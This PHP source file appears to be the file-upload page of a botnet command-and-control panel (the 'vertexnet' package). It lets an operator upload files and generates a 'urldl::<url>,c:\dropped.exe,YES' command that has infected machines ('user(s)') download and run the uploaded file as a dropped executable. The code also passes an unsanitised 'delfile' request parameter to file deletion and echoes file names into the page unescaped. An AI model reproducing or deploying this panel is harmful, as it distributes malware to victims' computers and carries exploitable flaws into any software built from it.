<?php

	/**
		Upload a file to a folder then you don't need to use FTP Client each time
		By DarkCoderSc
	*/
	
	include('inc/sessioncontrol.inc.php'); // test if user is logged

?>

<!-- Javascript_kiddy -->
<script type="text/javascript">
		/**
			Generate a command
		*/
		function GenCode(file){
			alert('Copy this " urldl::'+file+',c:\\dropped.exe,YES " to your clipboard and then you can use it on user(s) !');
			return true;	
		}
</script>

<?php 

/**
	If we want to delete an uploaded file
*/
if(isset($_GET['delfile'])){
	$filename = $_GET['delfile'];
	DeleteFile('upload/',$filename);
}

/**
	If we process any kind of file upload
*/
$errnum = 0; // 0 = no errors
if (isset($_FILES['p_file']['name'])){
	
	$dir = 'upload/';
	$file = basename($_FILES['p_file']['name']);
	$maxsize = 31457280;
	$fsize = filesize($_FILES['p_file']['tmp_name']);
	$extensions = array('.php', '.html', '.pl', '.py', '.js', '.htm');
	$extension = strrchr($_FILES['p_file']['name'], '.'); 
	
	/**
		Checking for errors
	*/
	if(in_array($extension, $extensions)) {
	     $errnum = 1; // File extension is wrong
	}
	if($fsize>$maxsize){
	     $errnum = 2; // File is to big
	}
	
	/**
		We continue only if error is equal to zero then no error was encountred
	*/
	if($errnum == 0){
	     $file = strtr($file, 
	          'ÀÁÂÃÄÅÇÈÉÊËÌÍÎÏÒÓÔÕÖÙÚÛÜÝàáâãäåçèéêëìíîïðòóôõöùúûüýÿ', 
	          'AAAAAACEEEEIIIIOOOOOUUUUYaaaaaaceeeeiiiioooooouuuuyy');
	     $file = preg_replace('/([^.a-z0-9]+)/i', '-', $file);
	     if(move_uploaded_file($_FILES['p_file']['tmp_name'], $dir . $file))
	     { 
	     			$errnum = -1; // That mean the process was successfull	
	     }else{
	          $errnum = 3; // General upload error
	     }
	}
}
?>

<h1 class="upico">Upload/Manage local files</h1>

<?php 
	
	$msgstr = ""; // message to display
	// $errnum contain the error number 0 = no erros and -1 = all success
	switch($errnum){
		case 1 :
			$msgstr = "The file extension is wrong.";
			break;
		case 2 : 
			$msgstr = "The file is to big to be uploaded !";
			break;
		case 3 :
			$msgstr = "An error occured durring the upload !";
			break;
		default: break;
	}
	
	//Displaying an error :(
	if ($errnum > 0){
		echo genHtmlErr($msgstr);	
	}else if ($errnum < 0){
		echo genHtmlOk("File successfully uploaded !");
	}

?>

<div class="divcmds">
	<div id="upage">Upload a new file</div>
	<div style="margin:5px;">
		<form method="POST" action="index.php?page=upl" enctype="multipart/form-data">
   	<input type="hidden" name="MAX_FILE_SIZE" value="31457280">
   	Input file : <input type="file" name="p_file">
   	<input type="submit" name="send" value="Process upload">
	 </form>
	</div>
</div>
<br/>
<div class="divcmds">
	<div id="upage">Upload manager</div>
	<br/>
	<div style="margin:5px;">
	<div class="divup">
		<table class="tusers">
			<th style="width:25px;">#</th>
			<th>File name</th>
			<th style="width:23px;">D</th>
			<th style="width:23px;">G</th>
			<th style="width:23px;">X</th>
				<?php
				
					//Init our vars
					$i = 0; // for our color list
					$color = ""; // Color container
					
					if ($handle = opendir('upload')) {
							/**
								Iterate in all our files of upload dir
							*/
					    while (false !== ($file = readdir($handle))) {
					    		//If it is a . or .. we don't go more far so we switch to next instruction
					        if ($file == "." || $file == "..") continue;
					        	
				        	$i++; // Inc
				        	
				        	//For semi coloration using the modulo
				        	if($i % 2 == 1){
										$color = "#232323";	
									}else{
										$color = "#303030";
									}
			  
									echo "<tr>";
				          echo "<td style=\"background-color:$color;\"><img style='margin-left:5px;' src='imgs/app.png'></img></td>";
				          echo "<td style=\"background-color:$color;\">$file</td>";
				          echo "<td style=\"background-color:$color;\"><a href=\"upload/$file\"><img src='imgs/dl2.png'></img></a></td>";
				          echo "<td style=\"background-color:$color;\"><a href=\"#\" onClick='GenCode(\"".selfURL()."/upload/$file\");'><img src='imgs/gen.png'></img></td>";
				          echo "<td style=\"background-color:$color;\"><a href=\"index.php?page=upl&amp;delfile=$file\"><img src='imgs/delete.png'></img></a></td>";
				          echo "</tr>";
					        
					    }
					    closedir($handle); // Close our file handle
					}else{
					    	/**
					    		Ouch the dir doesn't exist then we create it
					    	*/
					    	if (!mkdir("upload/", 0, true)) {
								    genHtmlErr("Error while trying to create the upload folder, create it manually or redownload the whole vertexnet package.");	
								}
					    }
				?>
			</table>
		</div>
	</div>
	<br/>
</div>
<br/>